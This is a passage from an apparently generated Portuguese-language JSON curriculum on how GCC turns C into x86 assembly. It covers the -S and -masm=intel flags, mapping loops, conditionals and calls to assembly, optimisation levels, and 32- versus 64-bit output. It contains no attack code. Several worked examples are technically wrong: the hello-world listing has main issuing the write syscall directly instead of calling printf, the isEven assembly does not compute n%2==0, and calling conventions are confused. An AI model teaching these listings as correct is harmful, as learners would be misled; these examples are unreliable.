                                    "GCC compiler",
                                    "Objdump tool",
                                    "Programa C 'int main(){return 0;}'"
                                  ],
                                  "tips": "Execute 'readelf -h' para confirmar entry point address.",
                                  "learningObjective": "Identificar e descrever o papel do entry point em assembly gerado.",
                                  "commonMistakes": [
                                    "Confundir _start com main",
                                    "Ignorar setup de runtime libc",
                                    "Não notar chamadas indiretas"
                                  ]
                                },
                                {
                                  "stepNumber": 3,
                                  "title": "Examinar o corpo principal e correlacionar com código fonte",
                                  "subSteps": [
                                    "Disassembie o binário e localize label 'main'.",
                                    "Mapeie instruções assembly para linhas de código C fonte (use -g e gdb).",
                                    "Identifique loops, condicionais e funções chamadas no corpo.",
                                    "Trace registradores: como variáveis locais são alocadas no stack.",
                                    "Compare múltiplas compilações com -O0 vs -O2 para ver otimizações."
                                  ],
                                  "verification": "Crie uma tabela correlacionando 3 linhas de C com blocos assembly equivalentes.",
                                  "estimatedTime": "50 minutos",
                                  "materials": [
                                    "GDB debugger",
                                    "Programa C com loop e if",
                                    "Objdump ou Ghidra"
                                  ],
                                  "tips": "Use 'gdb -q programa' e 'disassemble main' para análise interativa.",
                                  "learningObjective": "Mapear fluxos de controle high-level para assembly low-level.",
                                  "commonMistakes": [
                                    "Perder otimizações que inline funções",
                                    "Não rastrear spill no stack",
                                    "Ignorar prologue/epilogue de funções"
                                  ]
                                },
                                {
                                  "stepNumber": 4,
                                  "title": "Analisar a seção de saída e chamadas de sistema",
                                  "subSteps": [
                                    "Trace chamadas de exit: ret de main volta para _start, então syscall exit.",
                                    "Identifique syscalls comuns: write (1), exit (60) em x64 Linux.",
                                    "Analise parâmetros de syscall em registradores (rax=1, rdi=1, rsi=msg, rdx=len).",
                                    "Correlacione com printf/puts no código fonte.",
                                    "Verifique handling de erros e cleanup de stack."
                                  ],
                                  "verification": "Simule execução passo a passo no GDB até exit e anote registradores.",
                                  "estimatedTime": "35 minutos",
                                  "materials": [
                                    "GDB",
                                    "Programa C 'Hello World'",
                                    "Syscall table (man syscall)"
                                  ],
                                  "tips": "Em GDB, use 'si' para step instruction e 'info reg' para registradores.",
                                  "learningObjective": "Descrever sequência de saída e sua correlação com código fonte.",
                                  "commonMistakes": [
                                    "Confundir syscall numbers entre archs",
                                    "Não notar buffers em .rodata",
                                    "Esquecer alinhamento de stack"
                                  ]
                                }
                              ],
                              "practicalExample": "Compile 'hello.c' (printf(\"Hello\"); return 0;) com 'gcc -S -o hello.s hello.c'. Use objdump -d a.out para ver: _start setup argc/argv, chama main (mov $msg,%rsi; mov $6,%rdx; mov $1,%rax; syscall para write), então exit (mov $0,%rdi; mov $60,%rax; syscall).",
                              "finalVerifications": [
                                "Desenhe fluxo completo: _start -> main -> syscalls -> exit.",
                                "Explique registradores usados em uma syscall específica.",
                                "Correlacione 80% das instruções de main com código C.",
                                "Identifique 3 diferenças entre assembly otimizado e não-otimizado.",
                                "Trace execução de Hello World no GDB sem erros.",
                                "Liste seções ELF relevantes (.text, .rodata)."
                              ],
                              "assessmentCriteria": [
                                "Precisão na identificação de _start e main (100%).",
                                "Correlação correta entre C e assembly (>80% mapeamento).",
                                "Compreensão de syscalls e registradores (sem erros).",
                                "Uso correto de ferramentas (objdump, GDB).",
                                "Diagrama fluxo claro e completo.",
                                "Explicação verbal fluida sem hesitações."
                              ],
                              "crossCurricularConnections": [
                                "Programação Low-Level: Entender registradores e instruções CPU.",
                                "Sistemas Operacionais: Syscalls e ABI (Application Binary Interface).",
                                "Segurança Computacional: Base para análise de binários maliciosos.",
                                "Engenharia Reversa: Ferramentas como Ghidra/IDA Pro.",
                                "Arquitetura de Computadores: Pipeline e otimizações compilador."
                              ],
                              "realWorldApplication": "Em segurança computacional, analistas reversos usam isso para dissecar malwares: identificar entry points de infecção em _start, mapear payloads no main body e entender persistência via syscalls de saída modificadas."
                            },
                            "estimatedTime": "1 hora",
                            "difficulty": "intermediate",
                            "status": "not_started",
                            "prerequisites": []
                          }
                        ]
                      },
                      {
                        "id": "10.1.1.2.1.2",
                        "name": "Processo de Geração de Código Assembly por Compiladores",
                        "description": "Mecanismo de transformação de código fonte de alto nível (C/C++) ou intermediário (IR) em instruções assembly legíveis utilizando ferramentas como GCC e Clang.",
                        "specificSkills": [
                          {
                            "id": "10.1.1.2.1.2.1",
                            "name": "Utilizar flags de compilador para gerar assembly",
                            "description": "Compilar código C simples com opções como -S ou -masm=intel no GCC para produzir arquivos .s legíveis, verificando a saída em editores de texto.",
                            "atomicExpansion": {
                              "steps": [
                                {
                                  "stepNumber": 1,
                                  "title": "Configurar o ambiente de compilação GCC",
                                  "subSteps": [
                                    "Instale o GCC no seu sistema operacional (ex: apt install gcc no Linux, ou brew install gcc no macOS).",
                                    "Verifique a instalação executando 'gcc --version' no terminal.",
                                    "Crie um diretório de trabalho dedicado para os experimentos.",
                                    "Abra o terminal e navegue para o diretório criado.",
                                    "Teste um comando básico de compilação sem flags para garantir que o GCC funciona."
                                  ],
                                  "verification": "Comando 'gcc --version' retorna a versão instalada sem erros.",
                                  "estimatedTime": "15 minutos",
                                  "materials": [
                                    "Terminal ou prompt de comando",
                                    "GCC instalado",
                                    "Editor de texto como VS Code ou Vim"
                                  ],
                                  "tips": "Use um ambiente virtual ou container Docker para isolar testes e evitar conflitos.",
                                  "learningObjective": "Preparar um ambiente funcional para experimentação com flags de compilador.",
                                  "commonMistakes": [
                                    "Não verificar a instalação, levando a erros de 'command not found'",
                                    "Usar caminhos incorretos no terminal"
                                  ]
                                },
                                {
                                  "stepNumber": 2,
                                  "title": "Criar um programa C simples para teste",
                                  "subSteps": [
                                    "Crie um arquivo chamado 'hello.c' com um código simples: #include <stdio.h> int main() { printf('Hello, Assembly!\\n'); return 0; }",
                                    "Salve o arquivo no diretório de trabalho.",
                                    "Compile o código normalmente com 'gcc hello.c -o hello' para gerar um executável.",
                                    "Execute './hello' para confirmar que o código funciona.",
                                    "Analise o executável com 'file hello' ou 'ls -la' para entender o formato binário."
                                  ],
                                  "verification": "O executável 'hello' roda e imprime 'Hello, Assembly!' sem erros.",
                                  "estimatedTime": "10 minutos",
                                  "materials": [
                                    "Editor de texto",
                                    "Arquivo hello.c"
                                  ],
                                  "tips": "Mantenha o código minimalista para facilitar a leitura do assembly gerado.",
                                  "learningObjective": "Desenvolver um exemplo básico em C que sirva de base para geração de assembly.",
                                  "commonMistakes": [
                                    "Erros de sintaxe no C, como ponto e vírgula faltando",
                                    "Nomes de arquivo incorretos"
                                  ]
                                },
                                {
                                  "stepNumber": 3,
                                  "title": "Compilar com flags para gerar código assembly",
                                  "subSteps": [
                                    "Execute 'gcc -S hello.c' para gerar hello.s em formato AT&T.",
                                    "Execute 'gcc -S -masm=intel hello.c' para gerar em sintaxe Intel.",
                                    "Verifique se o arquivo .s foi criado com 'ls *.s'.",
                                    "Abra o arquivo .s em um editor de texto para inspecionar o conteúdo.",
                                    "Compare os dois formatos (AT&T vs Intel) se ambos gerados."
                                  ],
                                  "verification": "Arquivos hello.s (AT&T) e hello.s.intel (renomeie se necessário) são gerados e legíveis.",
                                  "estimatedTime": "20 minutos",
                                  "materials": [
                                    "Terminal",
                                    "GCC",
                                    "Editor de texto"
                                  ],
                                  "tips": "Use -o para especificar nome de saída: 'gcc -S -o hello_at_t.s hello.c'.",
                                  "learningObjective": "Dominar o uso das flags -S e -masm=intel para produzir assembly legível.",
                                  "commonMistakes": [
                                    "Esquecer a flag -S, gerando executável em vez de .s",
                                    "Confundir sintaxes AT&T e Intel"
                                  ]
                                },
                                {
                                  "stepNumber": 4,
                                  "title": "Analisar e verificar a saída assembly",
                                  "subSteps": [
                                    "Identifique seções como .text, .data no arquivo .s.",
                                    "Localize instruções equivalentes ao printf e return no main.",
                                    "Compile o assembly de volta com 'gcc hello.s -o hello_from_asm' e execute para validar.",
                                    "Experimente flags adicionais como -O0 para código não otimizado.",
                                    "Documente diferenças observadas entre compilações."
                                  ],
                                  "verification": "O executável recompilado do assembly roda corretamente e produz a mesma saída.",
                                  "estimatedTime": "25 minutos",
                                  "materials": [
                                    "Arquivos .s gerados",
                                    "Editor de texto",
                                    "Terminal"
                                  ],
                                  "tips": "Use ferramentas como 'objdump -d hello' para comparar com assembly puro.",
                                  "learningObjective": "Interpretar e validar o código assembly gerado pelo compilador.",
                                  "commonMistakes": [
                                    "Ignorar otimizações que alteram o assembly",
                                    "Não testar recompilação"
                                  ]
                                }
                              ],
                              "practicalExample": "Para um código C 'int add(int a, int b) { return a + b; }', use 'gcc -S -masm=intel add.c -o add.s' e verifique instruções como 'add eax, edi' no arquivo add.s.",
                              "finalVerifications": [
                                "Gera com sucesso arquivos .s de códigos C simples usando -S.",
                                "Alterna entre sintaxes AT&T e Intel com -masm=intel.",
                                "Inspeciona e compreende seções básicas do assembly (.text, .data).",
                                "Recompila assembly gerado em executável funcional.",
                                "Identifica impacto de flags como -O0 em otimizações.",
                                "Documenta pelo menos 3 diferenças entre assembly AT&T e Intel."
                              ],
                              "assessmentCriteria": [
                                "Precisão no uso de flags -S e -masm=intel sem erros de sintaxe.",
                                "Capacidade de ler e explicar pelo menos 5 linhas de assembly gerado.",
                                "Validação bem-sucedida da recompilação do assembly.",
                                "Identificação correta de erros comuns em geração de assembly.",
                                "Aplicação de flags adicionais para experimentação.",
                                "Documentação clara das observações."
                              ],
                              "crossCurricularConnections": [
                                "Arquitetura de Computadores: Entender instruções de máquina x86/AMD64.",
                                "Programação em C: Relacionar código fonte alto-nível com baixo-nível.",
                                "Segurança Computacional: Base para análise de binários e reverse engineering.",
                                "Sistemas Operacionais: Interação com linker e loader via assembly."
                              ],
                              "realWorldApplication": "Em segurança cibernética, engenheiros reversos usam essas flags para descompilar binários maliciosos, inspecionando assembly gerado de C para identificar vulnerabilidades como buffer overflows ou injeções de código."
                            },
                            "estimatedTime": "1 hora",
                            "difficulty": "intermediate",
                            "status": "not_started",
                            "prerequisites": []
                          },
                          {
                            "id": "10.1.1.2.1.2.2",
                            "name": "Mapear código fonte C para instruções assembly",
                            "description": "Correlacionar estruturas como loops, condicionais if/else e funções em C com blocos equivalentes de JMP, CMP, CALL e RET em assembly gerado.",
                            "atomicExpansion": {
                              "steps": [
                                {
                                  "stepNumber": 1,
                                  "title": "Entender Conceitos Básicos de Estruturas C e Instruções Assembly Equivalentes",
                                  "subSteps": [
                                    "Estude as estruturas fundamentais em C: variáveis, atribuições, condicionais (if/else), loops (for/while) e funções.",
                                    "Identifique instruções assembly chave: MOV (movimentação), CMP (comparação), JMP (salto incondicional), JE/JNE/JG (saltos condicionais), CALL (chamada de função) e RET (retorno).",
                                    "Compile um programa C simples (ex: printf('Hello')) usando gcc -S para gerar .s e analise o assembly gerado.",
                                    "Anote padrões comuns: como expressões aritméticas viram ADD/SUB e acessos a memória viram LEA/MOV.",
                                    "Compare registradores em C (auto variáveis em stack) vs assembly (uso de EBP/ESP)."
                                  ],
                                  "verification": "Liste 5 pares de estruturas C e suas instruções assembly equivalentes com exemplos breves.",
                                  "estimatedTime": "1 hora",
                                  "materials": [
                                    "Compilador GCC com flag -S",
                                    "Editor de texto para .s files",
                                    "Documentação x86 assembly (Intel manual)"
                                  ],
                                  "tips": [
                                    "Use -O0 para desabilitar otimizações e ver mapeamento direto.",
                                    "Foque em arquitetura x86-64 para consistência."
                                  ],
                                  "learningObjective": "Compreender as traduções básicas de alto nível para baixo nível.",
                                  "commonMistakes": [
                                    "Ignorar o prólogo/epílogo de funções.",
                                    "Confundir registradores de uso geral com stack."
                                  ]
                                },
                                {
                                  "stepNumber": 2,
                                  "title": "Mapear Condicionais If/Else em C para CMP e Saltos Condicionais",
                                  "subSteps": [
                                    "Escreva um código C com if/else simples (ex: if (a > b) x=1; else x=0;).",
                                    "Compile com gcc -S e localize o bloco: CMP para comparação, seguido de Jcc (como JG/JLE).",
                                    "Trace o fluxo: identifique labels de salto (L1:, L2:) e como o else é implementado como salto invertido.",
                                    "Teste variações: if aninhado e switch (mapeado para JMP table).",
                                    "Anote o papel do flag register (ZF, CF) em CMP/Jcc."
                                  ],
                                  "verification": "Para um if/else dado, aponte linhas exatas de CMP/JMP no assembly e explique o fluxo.",
                                  "estimatedTime": "1.5 horas",
                                  "materials": [
                                    "Código C de exemplo com condicionais",
                                    "GDB para debug assembly",
                                    "Ferramenta objdump"
                                  ],
                                  "tips": [
                                    "Use GDB 'stepi' para executar instrução por instrução.",
                                    "Desenhe fluxogramas para visualizar saltos."
                                  ],
                                  "learningObjective": "Mapear lógica condicional de C para controle de fluxo assembly.",
                                  "commonMistakes": [
                                    "Esquecer que else é salto sobre o bloco if.",
                                    "Confundir ordem de CMP (operandos invertidos mudam flags)."
                                  ]
                                },
                                {
                                  "stepNumber": 3,
                                  "title": "Mapear Loops (For/While) em C para JMP e Labels",
                                  "subSteps": [
                                    "Crie loops em C: for(int i=0; i<10; i++) {} e while().",
                                    "Gere assembly e identifique: label inicial, condição (CMP/JNE), corpo, incremento (INC/ADD), JMP de volta.",
                                    "Compare for vs while: for tem setup/incremento explícitos.",
                                    "Analise break/continue: break como JMP para fim, continue para próximo ciclo.",
                                    "Otimize manualmente: note como -O2 transforma loops em menos JMPs."
                                  ],
                                  "verification": "Desenhe o grafo de controle de um loop assembly, marcando condição, corpo e saída.",
                                  "estimatedTime": "1.5 horas",
                                  "materials": [
                                    "Exemplos C com loops variados",
                                    "Graphviz para fluxogramas",
                                    "GCC com diferentes flags -O"
                                  ],
                                  "tips": [
                                    "Comece com loops contadores simples para padrões claros.",
                                    "Ignore otimizações iniciais para mapeamento direto."
                                  ],
                                  "learningObjective": "Reconhecer e decompor estruturas de repetição em assembly.",
                                  "commonMistakes": [
                                    "Confundir JMP de volta (loop) com Jcc de saída.",
                                    "Não notar que condição é testada no topo ou fundo."
                                  ]
                                },
                                {
                                  "stepNumber": 4,
                                  "title": "Mapear Funções em C para CALL, RET e Stack Management",
                                  "subSteps": [
                                    "Defina funções em C: int func(int a) { return a*2; } e chame main().",
                                    "No assembly: localize CALL func, prólogo (PUSH EBP; MOV EBP,ESP; SUB ESP,locais), passagem de args (via stack/reg), RET.",
                                    "Trace recursão: como stack cresce com múltiplos CALLs.",
                                    "Analise convenções de chamada (cdecl: caller limpa stack).",
                                    "Integre com condicionais/loops dentro de funções."
                                  ],
                                  "verification": "Para uma função chamada, liste prólogo, body, epílogo e como args/retornam.",
                                  "estimatedTime": "1 hora",
                                  "materials": [
                                    "Códigos C com funções hierárquicas",
                                    "GDB com 'disassemble func'",
                                    "SysV ABI doc para x86"
                                  ],
                                  "tips": [
                                    "Use 'info frame' no GDB para ver stack frames.",
                                    "Foque em funções sem floats para simplicidade."
                                  ],
                                  "learningObjective": "Entender gerenciamento de pilha e chamadas de subrotinas.",
                                  "commonMistakes": [
                                    "Ignorar alinhamento stack (SUB ESP,8).",
                                    "Confundir caller vs callee saves registradores."
                                  ]
                                },
                                {
                                  "stepNumber": 5,
                                  "title": "Praticar Mapeamento Integrado e Verificação",
                                  "subSteps": [
                                    "Escreva um programa C completo com if, loop e função (ex: somar números pares até 100).",
                                    "Compile -S, mapeie todas estruturas identificadas nos steps anteriores.",
                                    "Use GDB para simular execução, pausando em JMP/CMP/CALL.",
                                    "Refatore manualmente partes assembly para testar entendimento.",
                                    "Compare com assembly de diferentes compiladores (Clang vs GCC)."
                                  ],
                                  "verification": "Produza um mapeamento anotado completo do C para assembly do programa.",
                                  "estimatedTime": "2 horas",
                                  "materials": [
                                    "Programa C integrado",
                                    "GDB avançado",
                                    "Compiladores GCC/Clang"
                                  ],
                                  "tips": [
                                    "Anote comentários no .s file para cada mapeamento.",
                                    "Teste com inputs variados para cobrir branches."
                                  ],
                                  "learningObjective": "Aplicar mapeamento holístico em código realista.",
                                  "commonMistakes": [
                                    "Não considerar otimizações que fundem estruturas.",
                                    "Perder registradores temporários em cálculos complexos."
                                  ]
                                }
                              ],
                              "practicalExample": "Código C: int isEven(int n) { return n%2==0; } int sumEvens(int max) { int sum=0; for(int i=0; i<max; i++) { if(isEven(i)) sum+=i; } return sum; } int main() { return sumEvens(10); }\nAssembly equivalente (x86-64, gcc -S -O0):\n- isEven: CMP EDI,2; SETE AL; MOVZX EAX,AL; RET\n- sumEvens: loop com MOV DWORD PTR [RBP-8],0; CMP [RBP-12],EDI; JG .L3; CALL isEven; TEST EAX,EAX; JE .L4; ADD [RBP-8],ECX; .L4: INC [RBP-12]; JMP loop\nMapeamento: if -> CMP/SETE/JE; loop -> CMP/JG/INC/JMP; func -> CALL/RET/prologo.",
                              "finalVerifications": [
                                "Corretamente identifica CMP/Jcc para todo if/else no assembly.",
                                "Traça fluxo completo de loops, incluindo condição e incremento.",
                                "Localiza CALL/RET e explica stack frame para funções.",
                                "Explica pelo menos 3 otimizações comuns que alteram mapeamento.",
                                "Mapeia um programa C completo sem erros em >90% das estruturas.",
                                "Usa GDB para demonstrar execução de JMP/CMP em vivo."
                              ],
                              "assessmentCriteria": [
                                "Precisão no mapeamento: 80%+ acerto em estruturas identificadas.",
                                "Profundidade de análise: explica flags e registradores usados.",
                                "Capacidade prática: gera e anota assembly de código próprio.",
                                "Compreensão de variações: lida com aninhamentos e otimizações.",
                                "Clareza na documentação: fluxogramas ou anotações legíveis.",
                                "Velocidade: completa mapeamento em <30min para código médio."
                              ],
                              "crossCurricularConnections": [
                                "Segurança Computacional: Reverse engineering binários para vulnerabilidades (ex: ROP via CALL/RET).",
                                "Arquitetura de Computadores: Entender pipeline e branch prediction em JMP.",
                                "Programação de Sistemas: Escrever shellcode ou otimizar em assembly.",
                                "Análise de Desempenho: Identificar gargalos em loops compilados.",
                                "Matemática Discreta: Lógica booleana em CMP/flags."
                              ],
                              "realWorldApplication": "Em cibersegurança, mapeia C para assembly em binários descompilados (usando IDA Pro/Ghidra) para encontrar buffer overflows em condicionais/loops; em desenvolvimento embedded, otimiza código crítico; em debugging, traça crashes em funções recursivas via stack traces."
                            },
                            "estimatedTime": "1.5 horas",
                            "difficulty": "intermediate",
                            "status": "not_started",
                            "prerequisites": []
                          },
                          {
                            "id": "10.1.1.2.1.2.3",
                            "name": "Analisar otimizações na geração de assembly",
                            "description": "Comparar assembly gerado com -O0, -O1 e -O2, identificando simplificações como eliminação de código morto e unrolling de loops.",
                            "atomicExpansion": {
                              "steps": [
                                {
                                  "stepNumber": 1,
                                  "title": "Preparar ambiente de compilação e código de teste",
                                  "subSteps": [
                                    "Instalar GCC e ferramentas como objdump se necessário.",
                                    "Criar um arquivo C simples com loop, código morto e operações básicas (ex: soma em loop com variável não usada).",
                                    "Compilar o código com flags -O0, -O1 e -O2 salvando os objetos (.o) em arquivos separados.",
                                    "Usar objdump -d para disassemblar cada arquivo e salvar em textos legíveis.",
                                    "Organizar os arquivos de assembly lado a lado para comparação."
                                  ],
                                  "verification": "Verificar se os três arquivos de assembly foram gerados e disassemblados corretamente sem erros de compilação.",
                                  "estimatedTime": "30 minutos",
                                  "materials": [
                                    "GCC compiler",
                                    "objdump",
                                    "Editor de texto (VS Code ou similar)",
                                    "Código fonte C de exemplo"
                                  ],
                                  "tips": "Use um Makefile para automatizar compilações com diferentes flags e evite incluir headers desnecessários.",
                                  "learningObjective": "Configurar um ambiente reproduzível para análise comparativa de otimizações.",
                                  "commonMistakes": [
                                    "Esquecer a flag -c para gerar .o sem linkar",
                                    "Usar arquitetura errada (ex: compilar para x86_64 em ARM)",
                                    "Não salvar disassemblies em arquivos separados"
                                  ]
                                },
                                {
                                  "stepNumber": 2,
                                  "title": "Analisar assembly gerado com -O0 (sem otimizações)",
                                  "subSteps": [
                                    "Examinar o assembly linha por linha, identificando correspondência direta com o código C.",
                                    "Notar redundâncias como stores/loads desnecessários e código morto compilado verbatim.",
                                    "Destacar loops implementados de forma ingênua sem unrolling.",
                                    "Anotar contadores de instruções e tamanho aproximado do código.",
                                    "Comparar mentalmente com o código fonte para mapear funções."
                                  ],
                                  "verification": "Criar um mapa manual ligando trechos de C ao assembly -O0, confirmando 100% de cobertura.",
                                  "estimatedTime": "45 minutos",
                                  "materials": [
                                    "Arquivos de assembly -O0",
                                    "Editor de texto para anotações",
                                    "Documentação GCC otimizações"
                                  ],
                                  "tips": "Use cores ou comentários para destacar seções no editor; foque em funções principais primeiro.",
                                  "learningObjective": "Entender o baseline de assembly sem otimizações para servir como referência.",
                                  "commonMistakes": [
                                    "Ignorar prologo/epilogo de funções",
                                    "Confundir variáveis locais com registradores",
                                    "Não notar código morto ainda presente"
                                  ]
                                },
                                {
                                  "stepNumber": 3,
                                  "title": "Comparar assembly -O1 com -O0 e identificar otimizações iniciais",
                                  "subSteps": [
                                    "Alinhar os assemblies -O0 e -O1 lado a lado.",
                                    "Identificar eliminação de código morto (variáveis não usadas removidas).",
                                    "Observar simplificações como força inline de funções pequenas e remoção de stores desnecessários.",
                                    "Contar redução de instruções e notar propagação de constantes.",
                                    "Documentar pelo menos 3 diferenças específicas."
                                  ],
                                  "verification": "Listar em um documento 5+ otimizações observadas em -O1 vs -O0 com citações de linhas.",
                                  "estimatedTime": "50 minutos",
                                  "materials": [
                                    "Assemblies -O0 e -O1",
                                    "Planilha ou tabela para comparações"
                                  ],
                                  "tips": "Use diff tool como vimdiff para visualizar diferenças visuais rapidamente.",
                                  "learningObjective": "Reconhecer otimizações de nível básico e seu impacto no tamanho/código.",
                                  "commonMistakes": [
                                    "Atribuir mudanças ao linker em vez do compilador",
                                    "Ignorar otimizações de registrador",
                                    "Confundir com -O2 prematuramente"
                                  ]
                                },
                                {
                                  "stepNumber": 4,
                                  "title": "Analisar assembly -O2 vs -O1/-O0 com foco em otimizações avançadas",
                                  "subSteps": [
                                    "Comparar -O2 com anteriores, destacando unrolling de loops (loops expandidos).",
                                    "Identificar vetorização, reordenação de instruções e eliminação de branches.",
                                    "Medir drasticamente redução de código (ex: loop de 10 iterações vira 10 instruções inline).",
                                    "Explicar como dead code é completamente eliminado e loops otimizados.",
                                    "Testar execução para confirmar equivalência funcional."
                                  ],
                                  "verification": "Executar binários compilados e confirmar saídas idênticas; documentar métricas de performance.",
                                  "estimatedTime": "60 minutos",
                                  "materials": [
                                    "Assemblies -O2, -O1, -O0",
                                    "Timer para benchmarks simples",
                                    "GCC docs on -O2"
                                  ],
                                  "tips": "Compile com -S para gerar .s diretamente e compare tamanhos de arquivo.",
                                  "learningObjective": "Dominar identificação de otimizações agressivas como unrolling e dead code elimination.",
                                  "commonMistakes": [
                                    "Assumir unrolling sem contar iterações",
                                    "Não verificar corretude funcional pós-otimização",
                                    "Confundir com otimizações de runtime"
                                  ]
                                }
                              ],
                              "practicalExample": "Código C: int dead_var = 5; int sum = 0; for(int i=0; i<4; i++) sum += i; return sum;. Com -O0: loop completo com dead_var armazenada. -O1: dead_var eliminada, loop simplificado. -O2: loop unrolled em 4 adds inline, sum=6 hardcoded.",
                              "finalVerifications": [
                                "Pode gerar e disassemblar assemblies para -O0/-O1/-O2 sem erros.",
                                "Lista corretamente 3+ exemplos de dead code elimination.",
                                "Identifica unrolling de loops comparando contagens de instruções.",
                                "Explica impacto de cada flag em tamanho e performance.",
                                "Compara assemblies e mapeia 80%+ de otimizações ao código fonte.",
                                "Executa benchmarks mostrando speedup com otimizações."
                              ],
                              "assessmentCriteria": [
                                "Precisão na identificação de otimizações específicas (dead code, unrolling).",
                                "Profundidade da comparação quantitativa (contagem de instruções).",
                                "Correta interpretação de mudanças assembly-C.",
                                "Uso adequado de ferramentas (objdump, diff).",
                                "Documentação clara com exemplos citados.",
                                "Compreensão de trade-offs (ex: tamanho vs velocidade)."
                              ],
                              "crossCurricularConnections": [
                                "Arquitetura de Computadores: Mapeamento de instruções otimizadas a pipeline CPU.",
                                "Programação Avançada: Escrita de código fonte otimizável.",
                                "Segurança Computacional: Análise de binários obfuscados por otimizações.",
                                "Engenharia de Software: Benchmarking e profiling de performance."
                              ],
                              "realWorldApplication": "Em reverse engineering de malware ou software proprietário, analisar otimizações em assembly ajuda a reconstruir lógica original, detectar packing ou identificar vulnerabilidades em código otimizado."
                            },
                            "estimatedTime": "1 hora",
                            "difficulty": "advanced",
                            "status": "not_started",
                            "prerequisites": []
                          }
                        ]
                      },
                      {
                        "id": "10.1.1.2.1.3",
                        "name": "Diferenças na Geração de Assembly 32 e 64 bits",
                        "description": "Variações na transformação para assembly x86 (32 bits) versus x64 (AMD64), focando em registradores, chamadas de sistema e acesso a memória.",
                        "specificSkills": [
                          {
                            "id": "10.1.1.2.1.3.1",
                            "name": "Gerar e comparar assembly 32 e 64 bits",
                            "description": "Usar flags -m32 e -m64 no GCC para compilar o mesmo código fonte, destacando diferenças em tamanho de registradores e ponteiros.",
                            "atomicExpansion": {
                              "steps": [
                                {
                                  "stepNumber": 1,
                                  "title": "Configurar o ambiente de compilação e preparar código fonte",
                                  "subSteps": [
                                    "Verifique se o GCC está instalado executando 'gcc --version' no terminal.",
                                    "Instale suporte a 32 bits se necessário (ex: 'sudo apt install gcc-multilib' no Ubuntu/Debian).",
                                    "Crie um diretório de trabalho: 'mkdir assembly-compare && cd assembly-compare'.",
                                    "Escreva um código C simples em 'prog.c': #include <stdio.h> int main() { int x = 42; int *p = &x; printf(\"%p %d\\n\", (void*)p, *p); return 0; }.",
                                    "Teste compilação básica: 'gcc prog.c -o prog' para garantir que o código funciona."
                                  ],
                                  "verification": "Código C compila sem erros e executa corretamente, exibindo endereço de ponteiro e valor 42.",
                                  "estimatedTime": "20-30 minutos",
                                  "materials": [
                                    "Terminal Linux/macOS com GCC",
                                    "Editor de texto (vim/nano/VSCode)",
                                    "Pacote gcc-multilib (para sistemas 64 bits)"
                                  ],
                                  "tips": [
                                    "Use um sistema Linux 64 bits para melhor suporte; teste 'gcc -m32 -v' para confirmar multilib.",
                                    "Salve o código com includes corretos para evitar warnings."
                                  ],
                                  "learningObjective": "Preparar um ambiente funcional para geração de assembly em arquiteturas 32 e 64 bits.",
                                  "commonMistakes": [
                                    "Esquecer de instalar gcc-multilib, causando erro 'gcc: error: unrecognized command line option ‘-m32’'",
                                    "Código C com erros de sintaxe ou missing <stdio.h>",
                                    "Não criar diretório dedicado, poluindo workspace"
                                  ]
                                },
                                {
                                  "stepNumber": 2,
                                  "title": "Gerar e analisar assembly para arquitetura 32 bits",
                                  "subSteps": [
                                    "Compile para 32 bits: 'gcc -m32 -S -o prog32.s prog.c -fno-pic'.",
                                    "Abra o arquivo gerado: 'cat prog32.s' ou use editor.",
                                    "Identifique registradores 32 bits: eax, ebx, ebp, esp (tamanhos de 32 bits).",
                                    "Localize operações com ponteiros: note instruções como 'movl' (move long, 32 bits) e tamanho de ponteiro (4 bytes).",
                                    "Anote seções como .text e calling convention (stdcall/cdecl padrão)."
                                  ],
                                  "verification": "Arquivo 'prog32.s' gerado sem erros de compilação e contém registradores como 'eax' e 'movl'.",
                                  "estimatedTime": "15-25 minutos",
                                  "materials": [
                                    "Terminal com GCC configurado",
                                    "Editor de texto para visualizar .s"
                                  ],
                                  "tips": [
                                    "Use -fno-pic para assembly mais simples sem position-independent code.",
                                    "Procure por 'main:' para focar na função principal."
                                  ],
                                  "learningObjective": "Entender a geração de assembly x86 32 bits, focando em registradores e ponteiros de 4 bytes.",
                                  "commonMistakes": [
                                    "Omitir -S (gera .o em vez de .s)",
                                    "Ignorar warnings de linking 32 bits",
                                    "Confundir registradores 64 bits em visualização errada"
                                  ]
                                },
                                {
                                  "stepNumber": 3,
                                  "title": "Gerar e analisar assembly para arquitetura 64 bits",
                                  "subSteps": [
                                    "Compile para 64 bits: 'gcc -m64 -S -o prog64.s prog.c'.",
                                    "Abra o arquivo: 'cat prog64.s'.",
                                    "Identifique registradores 64 bits: rax, rbx, rbp, rsp (tamanhos de 64 bits).",
                                    "Localize operações com ponteiros: note 'movq' (move quadword, 64 bits) e tamanho de ponteiro (8 bytes).",
                                    "Observe diferenças na calling convention (System V AMD64: args em registradores rdi, rsi)."
                                  ],
                                  "verification": "Arquivo 'prog64.s' gerado e exibe registradores como 'rax' e 'movq' para ponteiros.",
                                  "estimatedTime": "15-25 minutos",
                                  "materials": [
                                    "Terminal com GCC",
                                    "Editor de texto"
                                  ],
                                  "tips": [
                                    "-m64 é padrão em sistemas 64 bits, mas especifique para clareza.",
                                    "Compare visualmente com prog32.s já aberto em split view."
                                  ],
                                  "learningObjective": "Dominar geração de assembly x86-64, destacando registradores e ponteiros de 8 bytes.",
                                  "commonMistakes": [
                                    "Usar -m32 por engano",
                                    "Não notar rip-relative addressing em 64 bits",
                                    "Esquecer de incluir stdio.h causando stubs diferentes"
                                  ]
                                },
                                {
                                  "stepNumber": 4,
                                  "title": "Comparar assemblies e destacar diferenças chave",
                                  "subSteps": [
                                    "Use diff: 'diff -u prog32.s prog64.s > diff.txt' e analise.",
                                    "Compare registradores: eax/rax, movl/movq.",
                                    "Meça ponteiros: 4 bytes (32-bit) vs 8 bytes (64-bit) em loads/stores.",
                                    "Analise calling convention e prologue/epilogue de funções.",
                                    "Documente achados em um arquivo 'analysis.md' com exemplos de linhas diferentes."
                                  ],
                                  "verification": "Relatório de comparação identifica pelo menos 5 diferenças (registradores, ponteiros, instruções).",
                                  "estimatedTime": "20-30 minutos",
                                  "materials": [
                                    "Arquivos prog32.s e prog64.s",
                                    "Ferramenta diff ou editor com diff view"
                                  ],
                                  "tips": [
                                    "Ignore linhas de data/timestamps com 'diff -I timestamp'.",
                                    "Foque em main() para simplicidade."
                                  ],
                                  "learningObjective": "Analisar e contrastar assemblies 32 vs 64 bits, enfatizando impactos em tamanho e registradores.",
                                  "commonMistakes": [
                                    "Diff sem -u para contexto",
                                    "Ignorar otimizações do GCC alterando código",
                                    "Confundir sintaxe AT&T vs Intel"
                                  ]
                                }
                              ],
